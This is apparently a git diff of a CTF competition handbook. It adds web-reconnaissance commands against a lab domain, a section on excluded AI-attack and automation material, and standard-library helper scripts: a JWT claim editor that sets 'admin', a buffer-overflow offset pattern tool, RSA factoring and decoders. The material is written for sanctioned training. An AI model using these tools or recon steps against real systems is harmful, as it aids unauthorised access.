+wafw00f inlanefreight.com
+```
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--nikto"></a>
+
+###### Nikto
+```shell
+nikto -h inlanefreight.com -Tuning b
+```
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--crawling"></a>
+
+#### Crawling
+
+- robots.txt
+- /.well-known/
+- /.well-known/openid-configuration
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--reconspider"></a>
+
+###### Reconspider
+```bash
+python3 ReconSpider.py http://inlanefreight.com
+```
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--web-archives"></a>
+
+#### Web Archives
+<https://web.archive.org>
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--recon-automation"></a>
+
+#### Recon Automation
+
+```shell
+./finalrecon.py --headers --whois --url http://inlanefreight.com
+```
+
+
+
+---
+
+<a id="12-excluded-and-advanced"></a>
+
+<a id="12-excluded-and-advanced--excluded-workflows-and-advanced-material"></a>
+
+# Excluded workflows and advanced material
+
+The repository contains agent instructions and techniques that are unsuitable for this event handbook. The approved workbook and [official event rules](https://ajccbc.ncsa.or.th/cyber-sea-game-2026/) control tool use. A source file remaining in the repository is not approval to run it.
+
+<a id="12-excluded-and-advanced--aiml-and-agent-workflows-are-excluded"></a>
+
+## AI/ML and agent workflows are excluded
+
+All four files in `ctf-ai-ml/` are excluded from runnable event instructions:
+
+| Source | Material reviewed | Reason and useful manual alternative |
+|---|---|---|
+| `SKILL.md` | Model inspection, weight comparison, adversarial tests, remote LLM calls | AI/ML tools and libraries are not permitted. Identify ordinary file/container metadata with approved local tools; route conventional data/crypto logic to the relevant chapter |
+| `adversarial-ml.md` | FGSM, PGD, C&W, adversarial patches, poisoning, backdoor analysis, historical Keras/foolbox examples | These depend on prohibited ML frameworks/workflows. Do not install or run them; inspect an ordinary supplied parser or validation function manually if that is the actual challenge surface |
+| `model-attacks.md` | Weight negation, inversion, encoder collisions, LoRA merging, model extraction, membership inference | Model training/inference and related tools are excluded. For a non-AI artifact embedded in an archive, inspect the archive structure and recover that artifact without loading a model |
+| `llm-attacks.md` | Prompt injection, jailbreaks, token smuggling, context manipulation, agent tool misuse | AI interaction workflows are excluded. Treat embedded text as data; analyze any conventional HTTP/authentication/serialization issue manually |
+
+The web sources also contain chatbot and AI tool-call sections. Those sections are excluded even though the rest of their source files is adapted. There are no runnable prompts, framework installers, model downloads, or AI service calls in this handbook.
+
+<a id="12-excluded-and-advanced--tavily-mcp-and-automated-online-assistance-are-excluded"></a>
+
+## Tavily, MCP, and automated online assistance are excluded
+
+`ctf-similar-search/SKILL.md`, `search.py`, and `search.sh` implement Tavily-based search/extraction. The Python client requests an answer from the service and transmits search queries/URLs. These are not the manual local research workflow used here.
+
+`ctf-web/tools-mcp.md` describes Playwright/Burp MCP integrations, agent approval settings, scanners, and callback services. Use the approved browser DevTools and Burp Community interface manually as shown in [Web exploitation](#02-web-exploitation). Burp Community does not imply approval of every extension or Professional-only feature.
+
+For **Kali**, use supplied offline references without exposing challenge material:
+
+```bash
+rg -n -i 'padding oracle|nonce reuse' /opt/tools/hacktricks
+rg -n -i 'sudo|wildcard' /opt/tools/GTFOBins.github.io
+```
+
+Search for the general technique locally and compare its prerequisites to your challenge. If the checkout is absent, the handbook or manual reading of HackTricks/PayloadsAllTheThings is available: these reference sites are explicitly allowed by PDF p.6. Do not upload challenge files or seek outside assistance.
+
+<a id="12-excluded-and-advanced--tools-and-services-that-are-not-substitutes"></a>
+
+## Tools and services that are not substitutes
+
+| Source suggestion | Event-compliant replacement |
+|---|---|
+| Public webhook, callback tunnel, cloud function, external JWKS host | Organizer-provided callback service or a same-challenge observable response; otherwise keep a blind hypothesis unconfirmed |
+| Online hash cracking, public FactorDB lookup, online mathematical solver | Local Python arithmetic, listed local factoring/cracking tools, or an honest environment limitation |
+| Online compiler/decompiler | Approved local compiler/decompiler, supplied build artifact, or manual static analysis |
+| Dirsearch | A few evidence-backed paths in Repeater; targeted low-rate ffuf on Kali when appropriate |
+| JWT Editor, GraphQL Raider, Hackvertor, Copy As Python-Requests | Raw HTTP editing and local standard-library decoding; these extensions are explicitly unapproved |
+| YAFU | Local mathematical checks or an appropriate approved crypto-attacks implementation on Kali |
+| MMSSTV/RX-SSTV | Inspect the available approved audio workflow; verify what the listed SSTV package actually supports |
+| Large asynchronous fuzzing script | Manual baseline/control experiment and a small bounded candidate set |
+| Online sequence lookup/OEIS automation | Derive a recurrence from supplied terms and validate it locally |
+
+PDF p.5 permits non-AI libraries, dependencies, plugins and packages in both environments. The workbook's stricter AI/ML ban and named exclusions remain in this guide's routes; unlisted standalone applications require approval. [Reconciliation and source](#competition--what-is-allowed).
+
+<a id="12-excluded-and-advanced--advanced-does-not-mean-excluded"></a>
+
+## Advanced does not mean excluded
+
+Useful advanced topics remain in the handbook with their prerequisites:
+
+- [Web exploitation](#02-web-exploitation): parser disagreement, browser origins, cache/race/protocol behavior, serialization, source-based framework analysis, and static Web3 review.
+- [Cryptography](#07-cryptography): exact integer arithmetic, practical RSA and oracle demonstrations, nonces, modes, and PRNG modelling.
+- [Advanced cryptography](#14-advanced-crypto): lattices, ECC, small roots, unusual algebra, proof systems, post-quantum recognition, and reduced-round constructions.
+- [Miscellaneous](#11-miscellaneous): constrained interpreters, finite-state games, encoding reconstruction, RF/audio prerequisites, and explicitly challenge-scoped privilege puzzles.
+
+Version-specific exploits need the supplied version and configuration. The handbook does not present every historical payload as current. In particular, Python `eval` cannot accept assignment statements; private runtime memory offsets are not portable; prototype pollution needs a merge and a gadget; FROST is not inherently a lattice scheme; and a listed package name does not guarantee a particular decoder executable.
+
+The original high-concurrency fuzzer has further correctness limits: regex markers are not stripped consistently, processing-chain arguments do not uniformly match the callable signatures, redirects can hide the first response, and TLS verification is disabled in paths where it should remain enabled. It is retained as source provenance, not endorsed as a runnable event tool.
+
+<a id="12-excluded-and-advanced--what-to-do-when-a-challenge-seems-to-require-an-excluded-tool"></a>
+
+## What to do when a challenge seems to require an excluded tool
+
+Continue the parts that use approved local tools: inspect bytes, source, equations, normal requests, and supplied metadata. Identify the specific missing capability. Ask the organizer for clarification through the event's normal support channel before using a prohibited or unlisted tool. Do not upload the challenge, install an AI framework, or invoke an online service to bypass the restriction.
+
+File-by-file dispositions are recorded in `human-guide/review/web-coverage.json`. An “adapted” or “merged” file may contain excluded subsections; its notes identify those exceptions. “Reference-only” means historical/provenance material whose original commands are not part of the runnable handbook.
+
+
+---
+
+<a id="recipes"></a>
+
+<a id="recipes--recipe-downloads-and-source"></a>
+
+# Recipe downloads and source
+
+The short guide uses these complete scripts. In the website, each download is embedded and works offline. Save it inside a folder named `recipes` beside your challenge files; run from the parent folder. The ZIP already contains this layout. In Markdown, each link points to the included file.
+
+Use WSL Python 3 from the supplied list. These helpers use the standard library only. Each script accepts `--help`. They implement the specific assumptions stated in the [quick reference](#quickstart); they do not choose an attack for you.
+
+<a id="recipes--jwt_claimpy"></a>
+
+## jwt_claim.py
+
+[Download jwt_claim.py](recipes/jwt_claim.py)
+
+```python
+"""Edit a JWT payload locally. This does NOT generate a valid signature."""
+import argparse
+import base64
+import json
+from pathlib import Path
+
+
+def mutate(token, claim, value):
+    header, payload, signature = token.strip().split('.')
+    obj = json.loads(base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4)))
+    if not isinstance(obj, dict):
+        raise ValueError('JWT payload must be a JSON object')
+    obj[claim] = json.loads(value)
+    encoded = base64.urlsafe_b64encode(json.dumps(obj, separators=(',', ':')).encode()).rstrip(b'=').decode()
+    return '.'.join((header, encoded, signature))
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument('input', help='text file containing only the captured JWT')
+    ap.add_argument('--claim', default='role')
+    ap.add_argument('--value', default='"admin"', help='JSON value; default is string admin')
+    ap.add_argument('--out', default='edited-token.txt')
+    args = ap.parse_args()
+    try:
+        token = mutate(Path(args.input).read_text(encoding='utf-8-sig'), args.claim, args.value)
+        Path(args.out).write_text(token, encoding='ascii')
+        print('saved:', args.out)
+        print('Signature unchanged and invalid for edited payload. Only a server response can establish acceptance.')
+    except (ValueError, TypeError, OSError) as exc:
+        ap.exit(1, f'JWT stopped: {exc}\n')
+
+
+if __name__ == '__main__':
+    main()
+```
+
+<a id="recipes--layerspy"></a>
+
+## layers.py
+
+[Download layers.py](recipes/layers.py)
+
+```python
+"""Strict Base64 decode; optionally decompress one zlib/gzip layer, keeping both."""
+import argparse
+import base64
+import zlib
+from pathlib import Path
+
+
+def decode(raw, limit=16_000_000):
+    if len(raw) > limit:
+        raise ValueError('encoded input exceeds size budget')
+    first = base64.b64decode(b''.join(raw.split()), validate=True)
+    gzip = first.startswith(b'\x1f\x8b')
+    zheader = len(first) >= 2 and first[0] & 15 == 8 and first[0] >> 4 <= 7 and int.from_bytes(first[:2], 'big') % 31 == 0
+    if not (gzip or zheader):
+        return first, None, b''
+    dec = zlib.decompressobj(31 if gzip else 15)
+    second = dec.decompress(first, limit+1)
+    if len(second) > limit or dec.unconsumed_tail:
+        raise ValueError('decompressed output exceeds size budget')
+    if not dec.eof:
+        raise ValueError('compressed stream is truncated or needs a different format')
+    return first, second, dec.unused_data
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument('input')
+    ap.add_argument('--out', default='decoded', help='new output directory; existing directory is refused')
+    args = ap.parse_args()
+    try:
+        path = Path(args.input)
+        if path.stat().st_size > 16_000_000:
+            raise ValueError('input exceeds 16 MB budget')
+        first, second, trailer = decode(path.read_bytes())
+        out = Path(args.out)
+        out.mkdir(exist_ok=False)
+        (out/'layer1.bin').write_bytes(first)
+        print('layer1:', len(first), 'bytes; header:', first[:8].hex())
+        if second is not None:
+            (out/'layer2.bin').write_bytes(second)
+            print('layer2:', len(second), 'bytes; preview:', repr(second[:200]))
+            if trailer:
+                (out/'trailing.bin').write_bytes(trailer)
+            print('complete compressed stream; extra trailing bytes:', len(trailer))
+        else:
+            print('no zlib/gzip header; inspect layer1:', repr(first[:200]))
+        print('saved in:', out)
+    except (ValueError, OSError, zlib.error) as exc:
+        ap.exit(1, f'Decoding stopped: {exc}\n')
+
+
+if __name__ == '__main__':
+    main()
+```
+
+<a id="recipes--patternpy"></a>
+
+## pattern.py
+
+[Download pattern.py](recipes/pattern.py)
+
+```python
+import argparse
+from pathlib import Path
+
+def de_bruijn(alphabet, width):
+    k = len(alphabet)
+    work = [0] * (k * width)
+    result = []
+    def visit(t, period):
+        if t > width:
+            if width % period == 0:
+                result.extend(work[1:period + 1])
+        else:
+            work[t] = work[t - period]
+            visit(t + 1, period)
+            for value in range(work[t - period] + 1, k):
+                work[t] = value
+                visit(t + 1, t)
+    visit(1, 1)
+    return bytes(alphabet[i] for i in result)
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--length', type=int, default=512)
+parser.add_argument('--find', help='four bytes in memory order, as eight hex digits')
+parser.add_argument('--sent', help='verify the found offset against the pattern file actually sent')
+args = parser.parse_args()
+pattern = de_bruijn(b'abcdefgh', 4)
+assert len({pattern[i:i+4] for i in range(len(pattern)-3)}) == len(pattern)-3
+if args.find:
+    needle = bytes.fromhex(args.find)
+    if len(needle) != 4: raise SystemExit('supply exactly four bytes')
+    offset = pattern.find(needle)
+    print(offset)
+    if args.sent:
+        sent = Path(args.sent).read_bytes()
+        if sent != pattern[:len(sent)] or offset < 0 or offset+4 > len(sent) or sent[offset:offset+4] != needle:
+            raise SystemExit('not verified: wrong generator or crash bytes outside sent pattern')
+        print('verified against sent file:', args.sent, '; length:', len(sent))
+else:
+    if args.sent: parser.error('--sent requires --find')
+    if not 1 <= args.length <= len(pattern):
+        raise SystemExit(f'length must be 1..{len(pattern)}')
+    Path('pattern.bin').write_bytes(pattern[:args.length])
+    print('wrote', args.length, 'bytes')
+```
+
+<a id="recipes--png_tailpy"></a>
+
+## png_tail.py
+
+[Download png_tail.py](recipes/png_tail.py)
+
+```python
+"""Walk PNG chunk boundaries and save bytes after IEND. CRC issues are reported, not repaired."""
+import argparse
+import struct
+import zlib
+from pathlib import Path
+
+
+def inspect(data):
+    if data[:8] != b'\x89PNG\r\n\x1a\n':
+        raise ValueError('bad PNG signature')
+    pos, checks = 8, []
+    while pos+12 <= len(data):
+        size = struct.unpack_from('>I', data, pos)[0]
+        kind = data[pos+4:pos+8]
+        end = pos+12+size
+        if end > len(data):
+            raise ValueError('chunk extends beyond file')
+        crc = struct.unpack_from('>I', data, pos+8+size)[0]
+        checks.append((kind, size, zlib.crc32(data[pos+4:pos+8+size]) == crc))
+        pos = end
+        if kind == b'IEND':
+            if size != 0:
+                raise ValueError('IEND must have length zero')
+            return data[pos:], checks
+    raise ValueError('no complete IEND chunk')
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument('input')
+    ap.add_argument('--out', default='png-trailer.bin')
+    args = ap.parse_args()
+    try:
+        path = Path(args.input)
+        if path.stat().st_size > 64_000_000:
+            raise ValueError('input exceeds 64 MB budget')
+        tail, checks = inspect(path.read_bytes())
+        for kind, size, valid in checks:
+            print(kind, size, 'CRC OK' if valid else 'BAD CRC: inspect before trusting the structure')
+        Path(args.out).write_bytes(tail)
+        print('trailing bytes:', len(tail), 'preview:', repr(tail[:200]))
+        print('saved:', args.out)
+        print('Chunk walk only; not a full PNG validity check.')
+    except (ValueError, OSError) as exc:
+        ap.exit(1, f'PNG inspection stopped: {exc}\n')
+
+
+if __name__ == '__main__':
+    main()
+```
+
+<a id="recipes--rsapy"></a>
+
+## rsa.py
+
+[Download rsa.py](recipes/rsa.py)
+
+```python
+"""Raw two-prime RSA: known factors or a bounded close-prime check. No padding removal."""
+import argparse
+import json
+import math
+from pathlib import Path
+
+
+def recover(data, steps=100000):
+    number = lambda x: int(x, 0) if isinstance(x, str) else int(x)
+    n, e, c = (number(data[k]) for k in ('n', 'e', 'c'))
+    if n <= 3 or e <= 1 or not 0 <= c < n:
+        raise ValueError('require n > 3, e > 1, and 0 <= c < n')
+    if 'p' in data and 'q' in data:
+        p, q = number(data['p']), number(data['q'])
+    else:
+        if n % 2 == 0:
+            raise ValueError('even modulus: inspect factor 2 separately')
+        a = math.isqrt(n)
+        a += a*a < n
+        for _ in range(steps):
+            b2 = a*a - n
+            b = math.isqrt(b2)
+            if b*b == b2:
+                p, q = a-b, a+b
+                break
+            a += 1
+        else:
+            raise ValueError('no close factors within budget; use another RSA route')
+    if p <= 1 or q <= 1 or p == q or p*q != n:
+        raise ValueError('need distinct factors p*q == n; formula assumes both are prime')
+    d = pow(e, -1, math.lcm(p-1, q-1))
+    m = pow(c, d, n)
+    if pow(m, e, n) != c:
+        raise ValueError('re-encryption failed; check the factors and RSA assumptions')
+    length = number(data.get('length', max(1, (m.bit_length()+7)//8)))
+    return p, q, m.to_bytes(length, 'big')
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument('input', help='JSON: n, e, c; optional p, q and byte length')
+    ap.add_argument('--steps', type=int, default=100000)
+    ap.add_argument('--out', default='rsa-plain.bin')
+    args = ap.parse_args()
+    try:
+        p, q, plain = recover(json.loads(Path(args.input).read_text(encoding='utf-8-sig')), args.steps)
+        Path(args.out).write_bytes(plain)
+        print('factors:', p, q)
+        print('re-encryption: OK')
+        print('plaintext bytes:', repr(plain))
+        print('saved:', args.out)
+        print('No padding removed. Without length, leading zero bytes cannot be recovered.')
+    except (ValueError, KeyError, TypeError, OSError, OverflowError) as exc:
+        ap.exit(1, f'RSA stopped: {exc}\n')
+
+
+if __name__ == '__main__':
+    main()
+```
+
+<a id="recipes--tar_keeppy"></a>
+
+## tar_keep.py
+
+[Download tar_keep.py](recipes/tar_keep.py)
+
+```python
+"""Keep every regular tar member, including duplicate names, without trusting archive paths."""
+import argparse
+import json
+import tarfile
+from pathlib import Path
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument('input')
+    ap.add_argument('--out', default='tar-parts', help='new output directory')
+    args = ap.parse_args()
+    try:
+        out = Path(args.out)
+        out.mkdir(exist_ok=False)
+        total = 0
+        with tarfile.open(args.input, 'r:*') as tf, (out/'manifest.jsonl').open('w', encoding='utf-8') as log:
+            for i, member in enumerate(tf):
+                if i >= 10000:
+                    raise ValueError('member-count budget exceeded')
+                if not member.isfile():
+                    continue
+                total += member.size
+                if member.size > 64_000_000 or total > 512_000_000:
+                    raise ValueError('extraction budget exceeded; earlier members retained')
+                src = tf.extractfile(member)
+                if src is None:
+                    raise ValueError('regular file has no readable body')
+                with src:
+                    data = src.read(member.size+1)
+                if len(data) != member.size:
+                    raise ValueError('truncated member')
+                name = f'{i:06d}.bin'
+                (out/name).write_bytes(data)
+                log.write(json.dumps(dict(index=i, name=member.name, saved=name, size=len(data)))+'\n')
+                print(name, repr(member.name), len(data), 'bytes; preview:', repr(data[:120]))
+        print('manifest:', out/'manifest.jsonl')
+    except (ValueError, OSError, tarfile.TarError) as exc:
+        ap.exit(1, f'Tar extraction stopped: {exc}\n')
+
+
+if __name__ == '__main__':
+    main()
+```
+
+<a id="recipes--transformpy"></a>
+
+## transform.py
+
+[Download transform.py](recipes/transform.py)
+
+```python
+"""Invert exactly: expected[i] = ROL8(input[i] XOR repeated_key[i], rotation)."""
+import argparse
+import json
+from pathlib import Path
+
+
+def rol8(x, r):
+    r %= 8
+    return ((x << r) | (x >> ((8-r) % 8))) & 255
+
+
+def invert(data):
+    key = bytes.fromhex(data['key_hex'])
+    expected = bytes(data['expected'])
+    r = int(data['rotation'])
+    if not key:
+        raise ValueError('key_hex must contain at least one byte')
+    plain = bytes(rol8(y, -r) ^ key[i % len(key)] for i, y in enumerate(expected))
+    forward = bytes(rol8(x ^ key[i % len(key)], r) for i, x in enumerate(plain))
+    if forward != expected:
+        raise ValueError('forward check failed')
+    return plain
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument('input', help='JSON: key_hex, rotation, expected (byte integer array)')
+    ap.add_argument('--out', default='checker-plain.bin')
+    args = ap.parse_args()
+    try:
+        plain = invert(json.loads(Path(args.input).read_text(encoding='utf-8-sig')))
+        Path(args.out).write_bytes(plain)
+        print('forward check: OK')
+        print('candidate bytes:', repr(plain))
+        print('saved:', args.out)
+    except (ValueError, KeyError, TypeError, OSError) as exc:
+        ap.exit(1, f'Transform stopped: {exc}\n')
+
+
+if __name__ == '__main__':
+    main()
+```
+
+<a id="recipes--vm_bytepy"></a>
+
+## vm_byte.py
+
+[Download vm_byte.py](recipes/vm_byte.py)
+
+```python
+"""Enumerate one-byte input for a known straight-line 8-bit VM, resetting state each time."""
+import argparse
+import json
+from pathlib import Path
+
+
+def validate(program):
+    if not isinstance(program, list) or not 3 <= len(program) <= 1000:
+        raise ValueError('program must contain 3..1000 instruction rows')
+    widths = {'LOAD_INPUT': 1, 'XOR': 2, 'ADD': 2, 'ROL': 2, 'CMP': 2, 'HALT': 1}
+    for row in program:
+        if not isinstance(row, list) or not row or not isinstance(row[0], str) or len(row) != widths.get(row[0], 0):
+            raise ValueError(f'unsupported instruction: {row!r}')
+        if len(row) == 2 and (type(row[1]) is not int or not 0 <= row[1] <= 255):
+            raise ValueError('operands must be byte integers 0..255')
+    if program[0] != ['LOAD_INPUT'] or program[-1] != ['HALT']:
+        raise ValueError('program must start LOAD_INPUT and end HALT')
+    if sum(row[0] == 'LOAD_INPUT' for row in program) != 1 or sum(row[0] == 'HALT' for row in program) != 1 or not any(row[0] == 'CMP' for row in program):
+        raise ValueError('need exactly one input/halt and at least one CMP')
+
+
+def run(program, value):
+    acc, ok, trace = 0, True, []
+    for row in program:
+        op = row[0]
+        if op == 'LOAD_INPUT': acc = value
+        elif op == 'XOR': acc ^= row[1]
+        elif op == 'ADD': acc = (acc + row[1]) & 255
+        elif op == 'ROL':
+            r = row[1] % 8
+            acc = ((acc << r) | (acc >> ((8-r) % 8))) & 255
+        elif op == 'CMP': ok = ok and acc == row[1]
+        elif op == 'HALT': break
+        trace.append(f'{op}: 0x{acc:02x}')
+    return ok, trace
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument('input', help='JSON: program, e.g. [["LOAD_INPUT"],["XOR",35],["ADD",7],["CMP",111],["HALT"]]')
+    args = ap.parse_args()
+    try:
+        program = json.loads(Path(args.input).read_text(encoding='utf-8-sig'))['program']
+        validate(program)
+        found = []
+        for value in range(256):
+            ok, trace = run(program, value)
+            if ok:
+                found.append(value)
+                print(f'candidate: {value} / 0x{value:02x} / {bytes([value])!r}')
+                print(' -> '.join(trace), 'all comparisons: OK')
+        if not found:
+            raise ValueError('no byte satisfies every comparison; check opcode semantics')
+        print('candidate count:', len(found))
+    except (ValueError, KeyError, TypeError, OSError) as exc:
+        ap.exit(1, f'VM stopped: {exc}\n')
+
+
+if __name__ == '__main__':
+    main()
+```
+
+
+---
+
 <a id="tool-matrix"></a>
+
+<a id="tool-matrix--tool-matrix-the-complete-supplied-list"></a>
 
 # Tool matrix: the complete supplied list
 
 Source: `AJCCBC_CTF2026_Tool_Review_List_261015r11.xlsx`. Recorded versions are copied as supplied, not independently verified. Blank installation notes do not establish availability. The unapproved reasons are retained verbatim. The workbook contains some replacement characters; these are preserved rather than guessed.
 
-Windows/WSL and Kali are separate environments. See the location column before choosing a command. No row authorizes every plugin, dependency, or hosted service associated with a product.
+Windows/WSL and Kali are separate environments. See the location column before choosing a command. For non-AI additions, named exclusions and hosted-service restrictions, use [Competition setup](#competition--what-is-allowed).
+
+<a id="tool-matrix--windows-wsl-39-entries"></a>
 
 ## Windows / WSL · 39 entries
 
@@ -6061,6 +13347,8 @@ Windows/WSL and Kali are separate environments. See the location column before c
 | Notepad++ | Latest | installed in Windows | Installer (x64). A portable edition is also available. | Approved Tool List for Windows!C44 |
 | dnSpyEx (dnSpy) | Latest | installed in Windows | Portable zip. Use dnSpy-net-win64.zip (self-contained; no .NET installation needed). | Approved Tool List for Windows!C45 |
 | Eric Zimmerman's Tools | Latest | installed in Windows | Run Get-ZimmermanTools.ps1 to download the tools. Internet access and the .NET Desktop Runtime are required. | Approved Tool List for Windows!C46 |
+
+<a id="tool-matrix--kali-161-entries"></a>
 
 ## Kali · 161 entries
 
@@ -6228,6 +13516,8 @@ Windows/WSL and Kali are separate environments. See the location column before c
 | zstd | 1.5.7 | — | — | Approved Tool List for Kali!C167 |
 | Zui (formerly Brim) | (not captured) | — | Version not captured (the command only printed a startup message) | Approved Tool List for Kali!C168 |
 
+<a id="tool-matrix--not-approved-82-entries"></a>
+
 ## Not approved · 82 entries
 
 | Tool | Version | Installation/location | Notes/reason | Workbook source |
@@ -6321,11 +13611,15 @@ Windows/WSL and Kali are separate environments. See the location column before c
 
 <a id="source-coverage"></a>
 
+<a id="source-coverage--source-coverage-and-editorial-decisions"></a>
+
 # Source coverage and editorial decisions
 
 The original snapshot contains **286 files**, including **197 Markdown files**. Every file is listed below. Category guides were reviewed for human adaptation; infrastructure received inventory/structural review. This is not a claim that every historical exploit was executed or every source sentence was reproduced.
 
 **Adapted/merged** means useful content was rewritten or consolidated. **Reference-only** retains specialist/history or development context without presenting it as a ready event recipe. **Excluded** explains material incompatible with the event or human workflow. The chapter is the destination or nearest explanation. Review details and original SHA-256 hashes are in `review/combined-coverage.json`.
+
+Additional competition source: the subsequently supplied 23-page [environment PDF](sources/practice-environment.pdf) is reconciled in [Competition setup](#competition). Its source/copy hash and page-by-page disposition are recorded separately in `review/environment-validation.json` and `review/environment-audit.md`; it is not silently added to the original 286-file baseline.
 
 | Original source | Disposition | Human destination | Review note |
 | --- | --- | --- | --- |
@@ -6621,7 +13915,7 @@ The original snapshot contains **286 files**, including **197 Markdown files**. 
 
 ## Attribution and license
 
-Adapted from the supplied ctf-skills repository. Original copyright (c) 2026 Lukasz Jagiello.
+Adapted from the supplied ctf-skills repository. Original copyright (c) 2026 Lukasz Jagiello. Personal CPTS notes supplied by Vernon are separate from this attribution.
 
 ```text
 MIT License
